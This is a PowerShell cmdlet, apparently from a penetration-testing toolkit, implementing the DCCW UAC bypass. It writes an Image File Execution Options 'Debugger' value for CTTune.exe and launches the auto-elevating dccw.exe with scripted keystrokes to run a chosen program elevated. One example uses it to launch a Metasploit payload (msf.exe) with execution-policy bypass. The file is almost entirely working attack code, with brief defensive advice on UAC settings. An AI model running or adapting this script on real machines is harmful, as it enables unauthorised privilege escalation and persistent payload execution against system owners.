<#
.SYNOPSIS
This cmdlet is used to elevate a users privilege if they are a member of an Administrator group effectively bypassing User Access Control (UAC). This takes advantage of Display Color Calibration Tool "DCCW" to do this


.DESCRIPTION
A new registry key will be created at "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options". This will only work on Windows 8.1 and above. This works because DCCW is a Microsoft signed binary that auto-elevates itself due to its manifest


.PARAMETER Program
Specify the absolute or relative path for executable or application you wish to run with elevated permissions. Specifies a local script that this cmdlet runs with elevated permissions. The script must exist on the local  computer or in a directory that the local computer can access.

.PARAMETER RemoveRegistryValue
This parameter is used to delete the registry value created after the cmdlet finishes its execution.


.EXAMPLE
Invoke-DccwPersistence -Program "cmd"
# This example exploits the DCCW UAC bypass method to open Commnad Prompt with administrative privileges

.EXAMPLE
Invoke-DccwPersistence "cmd /c powershell -noexit -nop -exec bypass -c C:\Temp\msf.exe"
# This example exploits the DCCW UAC bypass method to execute the payload msf.exe with administrative privileges


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.LINK
https://bartblaze.blogspot.com/2017/06/display-color-calibration-tool-dccw-and.html
https://osbornepro.com
https://writeups.osbornepro.com
https://btpssecpack.osbornepro.com
https://github.com/tobor88
https://gitlab.com/tobor88
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286


.INPUTS
None


.OUTPUTS
None

#>
Function Invoke-DccwPersistence {
    [CmdletBinding()]
    Param(
        [Parameter(
            Position=0,
            Mandatory=$False,
            ValueFromPipeLine=$False,
            HelpMessage='Enter an executable you wish to execute to gain privesc. Default value is cmd /c start powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoExit -NoProfile')]  # End Parameter
        [String]$Program = "cmd",

        [Parameter(
            Mandatory=$False,
            ValueFromPipeline=$False)] #  End Parameter
        [Switch][Bool]$RemoveRegistryValue
    )  # End param

BEGIN
{

    If (!([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
    {

        Throw "This is required to run as an adminstrator to establish persistence."

    }  # End if

    $RegValue = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\CTTune.exe"
    $Value = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" | Select-Object -Property "ConsentPromptBehaviorAdmin"

    Switch ($Value.ConsentPromptBehaviorAdmin)
    {

        0 { $Message = "0 : Elevate without prompting" }
        1 { $Message = "1 : Prompt for credentials on the secure desktop" }
        2 { $Message = "2 : Prompt for consent on the secure desktop" }
        3 { $Message = "3 : Prompt for credentials"}
        4 { $Message = "4 : Prompt for consent"}
        5 { $Message = "5 : Prompt for consent for non-Windows binaries"}

    }  # End Switch

    If (($Value.ConsentPromptBehaviorAdmin -eq 1) -or ($Value.ConsentPromptBehaviorAdmin -eq 2))
    {

        Write-Output "This device is not vulnerable to the DCCW UAC bypass method. `nUAC Settings: $Message"

    }  # End If
    Else
    {

        Write-Warning "This device is vulnerable to the DCCW bypass method. `nCurrent UAC Settings: $Message"
        Write-Output "To defend against the DCCW UAC bypass there are 2 precautions to take.`n1.) Do not sign in with a user who is a member of the local administraors group. `n2.) Change HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System's values ConsentPromptBehaviorAdmin to a value of 1 or 2."

    }  # End Else

}  # End BEGIN
PROCESS
{

    Write-Verbose "Creating Registry Key"
    If (!(Test-Path -Path $RegValue))
    {

        New-Item -Path $RegValue -Force
        New-ItemProperty -Path $RegValue -Name "Debugger" -Value $Program -Force

    }  # End If
    Else
    {

        Write-Verbose "Registry Value $RegValue already exists"

    }  # End Else

    Write-Verbose "Starting the DCCW process"
    Start-Process -FilePath "C:\Windows\SysWOW64\dccw.exe"


    $WindowTitles = 'Display Color Calibration','ClearType Text Tuner'
    ForEach ($WindowTitle in $WindowTitles)
    {

        $WindowHandle = Get-Process | Where-Object { $_.MainWindowTitle -Like "*$WindowTitle*" } | Select-Object -ExpandProperty MainWindowHandle

        [Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
        For ($i = 0; $i -lt 15; $i++)
        {

            [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
            $i++

        }  # End For

    }  # End ForEach

    Start-Sleep -Seconds 1

}  # End PROCESS
END
{

    If ($RemoveRegistryValue.IsPresent)
    {

        Write-Verbose "Removing Registry Key"
        If (Test-Path -Path $RegValue)
        {

            Remove-Item -Path $RegValue -Recurse -Force

        }  # End If

    }  # End If

    Write-Verbose "Closing the CTTune window"
    Do
    {

        Start-Sleep -Seconds 1

    } Until (Get-Process -Name cttune -ErrorAction SilentlyContinue)

    Stop-Process -Name cttune -Force

}  # End END

}  # End Function Invoke-DccwPersistence
